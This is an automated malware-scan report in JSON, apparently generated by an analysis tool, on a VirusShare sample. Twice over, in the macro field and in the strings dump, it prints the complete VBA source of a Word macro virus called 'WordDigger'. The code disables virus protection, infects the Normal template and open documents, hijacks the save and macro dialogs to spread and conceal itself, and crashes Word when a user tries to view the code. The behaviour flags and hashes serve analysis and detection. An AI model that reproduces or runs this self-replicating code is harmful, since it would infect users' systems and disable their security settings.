{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoExec": "Runs when the Word document is opened",
            "AutoOpen": "Runs when the Word document is opened",
            "Call": "May call a DLL using Excel 4 Macros",
            "CodeModule": "May attempt to modify the VBA code",
            "Environ": "May read system environment variables",
            "Kill": "May delete a file",
            "Lib": "May run code from a DLL",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Option Explicit\nConst NStat = 0\nConst VStat = 0\n'Copyright \ufffd 1999 by dd!Actor.\n'All rights reserved.\nPublic Declare Sub FatalAppExit Lib \"kernel32\" Alias \"FatalAppExitA\" (ByVal uAction As Long, ByVal lpMessageText As String)\nSub AutoOpen()\nApplication.EnableCancelKey = wdCancelDisabled\nWordBasic.DisableAutoMacros 0\nOptions.VirusProtection = 0\nOptions.SaveNormalPrompt = 0\nDim pth As String, i As Byte, dc As Object\nDim NInst As Boolean, AInst As Boolean\nOn Error Resume Next\nApplication.VBE.MainWindow.Visible = False\npth = Environ(\"temp\") & \"\\~WRD000^.tmp\"\nSet dc = NormalTemplate.VBProject.VBComponents\nFor i = 1 To dc.Count\nIf dc(i).Name = \"WordDigger\" Then\nNInst = 1\ndc(i).Export pth\nEnd If\nNext i\nSet dc = ActiveDocument.VBProject.VBComponents\nFor i = 1 To dc.Count\nIf dc(i).Name = \"WordDigger\" Then\nAInst = 1\ndc(i).Export pth\nEnd If\nNext i\nIf AInst = True And NInst = False Then Set dc = NormalTemplate\nIf AInst = False And NInst = True Then Set dc = ActiveDocument\nIf AInst = False Or NInst = False Then\ndc.VBProject.VBComponents.Import pth\nIf Mid(ActiveDocument.FullName, 2, 1) = \":\" Then dc.Save\nKill pth\nEnd If\nIf Hour(Time) = Minute(Time) Then\nAutoCorrect.ReplaceText = True\nAutoCorrect.Entries.Add \",\", \", \ufffd\ufffd\ufffd\ufffd,\"\nMsgBox \"Copyright \ufffd 1999 by dd!Actor.\" + vbCrLf + \"All rights reserved.\", vbOKOnly + vbInformation\nEnd If\nEnd Sub\nSub AutoExec()\nOn Error Resume Next\nApplication.EnableCancelKey = wdCancelDisabled\nApplication.VBE.MainWindow.Visible = False\nWordBasic.DisableAutoMacros 0\nOptions.VirusProtection = 0\nOptions.SaveNormalPrompt = 0\nIf Hour(Time) = Minute(Time) Then\nAutoCorrect.ReplaceText = True\nAutoCorrect.Entries.Add \",\", \", \ufffd\ufffd\ufffd\ufffd,\"\nMsgBox \"Copyright \ufffd 1999 by dd!Actor.\" + vbCrLf + \"All rights reserved.\", vbOKOnly + vbInformation\nEnd If\nEnd Sub\nSub FileSave()\nOn Error Resume Next\nCall AutoOpen\nActiveDocument.Save\nEnd Sub\nSub FileSaveAs()\nOn Error Resume Next\nCall AutoOpen\nDialogs(wdDialogFileSaveAs).Show\nEnd Sub\nSub ToolsOptions()\nOn Error Resume Next\nDim dc As Object\nDim VirStat As Byte\nDim NorStat As Byte\nOptions.SaveNormalPrompt = NStat\nOptions.VirusProtection = VStat\nDialogs(wdDialogToolsOptions).Show\nSet dc = ActiveDocument.VBProject.VBComponents(\"WordDigger\").CodeModule\nIf Options.SaveNormalPrompt = True Then NorStat = 1\nIf Options.VirusProtection = True Then VirStat = 1\ndc.ReplaceLine 2, \"const NStat=\" & NorStat\ndc.ReplaceLine 3, \"const VStat=\" & VirStat\nSet dc = NormalTemplate.VBProject.VBComponents(\"WordDigger\").CodeModule\ndc.ReplaceLine 2, \"const NStat=\" & NorStat\ndc.ReplaceLine 3, \"const VStat=\" & VirStat\nOptions.SaveNormalPrompt = 0\nOptions.VirusProtection = 0\nNormalTemplate.Save\nNormalTemplate.Saved = True\nEnd Sub\nSub ToolsMacro()\nDim i As Byte, n As Integer, pth As String\nDim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean\nDim dc As Object, dcN As Object, dcA As Object\nOn Error Resume Next\npth = Environ(\"temp\") & \"\\~WRD000^.tmp\"\nSet dcN = NormalTemplate.VBProject.VBComponents\nSet dcA = ActiveDocument.VBProject.VBComponents\nSet dc = NormalTemplate.VBProject\nGoSub 10\nNInst = res\nSet dc = ActiveDocument.VBProject\nGoSub 10\nAInst = res\nIf NInst = True Then\nSet dc = dcN\nGoSub 20\nNsav = NormalTemplate.Saved\nNormalTemplate.Saved = 1\nEnd If\nIf AInst = True Then\nSet dc = dcA\nGoSub 20\nAsav = ActiveDocument.Saved\nActiveDocument.Saved = 1\nEnd If\nDialogs(wdDialogToolsMacro).Show\ndcN(\"WordDigger\").CodeModule.AddFromFile pth\ndcA(\"WordDigger\").CodeModule.AddFromFile pth\ndcN.CodeModule.AddFromFile pth\nNormalTemplate.Saved = Nsav\ndcA.CodeModule.AddFromFile pth\nActiveDocument.Saved = Asav\nKill pth\nExit Sub\n10 For i = 1 To dc.VBComponents.Count\nIf dc.VBComponents(i).Name = \"WordDigger\" Then\nres = 1\ndc.VBComponents(i).Export pth\nEnd If\nNext i\nReturn\n20 dc.Export pth\nn = dc(\"WordDigger\").CodeModule.CountOfLines\ndc(\"WordDigger\").CodeModule.DeleteLines 1, n\nReturn\nEnd Sub\nSub ViewVBCode()\nIf Dir(\"c:\\digger.die\") = \"\" Then\nFatalAppExit 0, \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd WinWord \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd VBA! Code : dd!Actor\"\nElse\nApplication.VBE.MainWindow.Visible = True\nEnd If\nEnd Sub\n"
    },
    "filename": "VirusShare_475201f76dd817a0d28b5489dd764714",
    "filesize": 4245,
    "filetype": "ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "475201f76dd817a0d28b5489dd764714",
        "sha1": "c232d82bb53384f83c8fa3fcc97629008fd960c7",
        "sha256": "0fc35d91829b8442690d475edeb973b793756c5d1b0ee1d1b0e0b1d181dff3a8"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Attribute VB_Name = \"WordDigger\"",
            "Option Explicit",
            "Const NStat = 0",
            "Const VStat = 0",
            "'Copyright  1999 by dd!Actor.",
            "'All rights reserved.",
            "Public Declare Sub FatalAppExit Lib \"kernel32\" Alias \"FatalAppExitA\" (ByVal uAction As Long, ByVal lpMessageText As String)",
            "Sub AutoOpen()",
            "Application.EnableCancelKey = wdCancelDisabled",
            "WordBasic.DisableAutoMacros 0",
            "Options.VirusProtection = 0",
            "Options.SaveNormalPrompt = 0",
            "Dim pth As String, i As Byte, dc As Object",
            "Dim NInst As Boolean, AInst As Boolean",
            "On Error Resume Next",
            "Application.VBE.MainWindow.Visible = False",
            "pth = Environ(\"temp\") & \"\\~WRD000^.tmp\"",
            "Set dc = NormalTemplate.VBProject.VBComponents",
            "For i = 1 To dc.Count",
            "If dc(i).Name = \"WordDigger\" Then",
            "NInst = 1",
            "dc(i).Export pth",
            "End If",
            "Next i",
            "Set dc = ActiveDocument.VBProject.VBComponents",
            "For i = 1 To dc.Count",
            "If dc(i).Name = \"WordDigger\" Then",
            "AInst = 1",
            "dc(i).Export pth",
            "End If",
            "Next i",
            "If AInst = True And NInst = False Then Set dc = NormalTemplate",
            "If AInst = False And NInst = True Then Set dc = ActiveDocument",
            "If AInst = False Or NInst = False Then",
            "dc.VBProject.VBComponents.Import pth",
            "If Mid(ActiveDocument.FullName, 2, 1) = \":\" Then dc.Save",
            "Kill pth",
            "End If",
            "If Hour(Time) = Minute(Time) Then",
            "AutoCorrect.ReplaceText = True",
            "AutoCorrect.Entries.Add \",\", \", ,\"",
            "MsgBox \"Copyright  1999 by dd!Actor.\" + vbCrLf + \"All rights reserved.\", vbOKOnly + vbInformation",
            "End If",
            "End Sub",
            "Sub AutoExec()",
            "On Error Resume Next",
            "Application.EnableCancelKey = wdCancelDisabled",
            "Application.VBE.MainWindow.Visible = False",
            "WordBasic.DisableAutoMacros 0",
            "Options.VirusProtection = 0",
            "Options.SaveNormalPrompt = 0",
            "If Hour(Time) = Minute(Time) Then",
            "AutoCorrect.ReplaceText = True",
            "AutoCorrect.Entries.Add \",\", \", ,\"",
            "MsgBox \"Copyright  1999 by dd!Actor.\" + vbCrLf + \"All rights reserved.\", vbOKOnly + vbInformation",
            "End If",
            "End Sub",
            "Sub FileSave()",
            "On Error Resume Next",
            "Call AutoOpen",
            "ActiveDocument.Save",
            "End Sub",
            "Sub FileSaveAs()",
            "On Error Resume Next",
            "Call AutoOpen",
            "Dialogs(wdDialogFileSaveAs).Show",
            "End Sub",
            "Sub ToolsOptions()",
            "On Error Resume Next",
            "Dim dc As Object",
            "Dim VirStat As Byte",
            "Dim NorStat As Byte",
            "Options.SaveNormalPrompt = NStat",
            "Options.VirusProtection = VStat",
            "Dialogs(wdDialogToolsOptions).Show",
            "Set dc = ActiveDocument.VBProject.VBComponents(\"WordDigger\").CodeModule",
            "If Options.SaveNormalPrompt = True Then NorStat = 1",
            "If Options.VirusProtection = True Then VirStat = 1",
            "dc.ReplaceLine 2, \"const NStat=\" & NorStat",
            "dc.ReplaceLine 3, \"const VStat=\" & VirStat",
            "Set dc = NormalTemplate.VBProject.VBComponents(\"WordDigger\").CodeModule",
            "dc.ReplaceLine 2, \"const NStat=\" & NorStat",
            "dc.ReplaceLine 3, \"const VStat=\" & VirStat",
            "Options.SaveNormalPrompt = 0",
            "Options.VirusProtection = 0",
            "NormalTemplate.Save",
            "NormalTemplate.Saved = True",
            "End Sub",
            "Sub ToolsMacro()",
            "Dim i As Byte, n As Integer, pth As String",
            "Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean",
            "Dim dc As Object, dcN As Object, dcA As Object",
            "On Error Resume Next",
            "pth = Environ(\"temp\") & \"\\~WRD000^.tmp\"",
            "Set dcN = NormalTemplate.VBProject.VBComponents",
            "Set dcA = ActiveDocument.VBProject.VBComponents",
            "Set dc = NormalTemplate.VBProject",
            "GoSub 10",
            "NInst = res",
            "Set dc = ActiveDocument.VBProject",
            "GoSub 10",
            "AInst = res",
            "If NInst = True Then",
            "Set dc = dcN",
            "GoSub 20",
            "Nsav = NormalTemplate.Saved",
            "NormalTemplate.Saved = 1",
            "End If",
            "If AInst = True Then",
            "Set dc = dcA",
            "GoSub 20",
            "Asav = ActiveDocument.Saved",
            "ActiveDocument.Saved = 1",
            "End If",
            "Dialogs(wdDialogToolsMacro).Show",
            "dcN(\"WordDigger\").CodeModule.AddFromFile pth",
            "dcA(\"WordDigger\").CodeModule.AddFromFile pth",
            "dcN.CodeModule.AddFromFile pth",
            "NormalTemplate.Saved = Nsav",
            "dcA.CodeModule.AddFromFile pth",
            "ActiveDocument.Saved = Asav",
            "Kill pth",
            "Exit Sub",
            "10 For i = 1 To dc.VBComponents.Count",
            "If dc.VBComponents(i).Name = \"WordDigger\" Then",
            "res = 1",
            "dc.VBComponents(i).Export pth",
            "End If",
            "Next i",
            "Return",
            "20 dc.Export pth",
            "n = dc(\"WordDigger\").CodeModule.CountOfLines",
            "dc(\"WordDigger\").CodeModule.DeleteLines 1, n",
            "Return",
            "End Sub",
            "Sub ViewVBCode()",
            "If Dir(\"c:\\digger.die\") = \"\" Then",
            "FatalAppExit 0, \" WinWord      VBA! Code : dd!Actor\"",
            "Else",
            "Application.VBE.MainWindow.Visible = True",
            "End If",
            "End Sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.348822",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
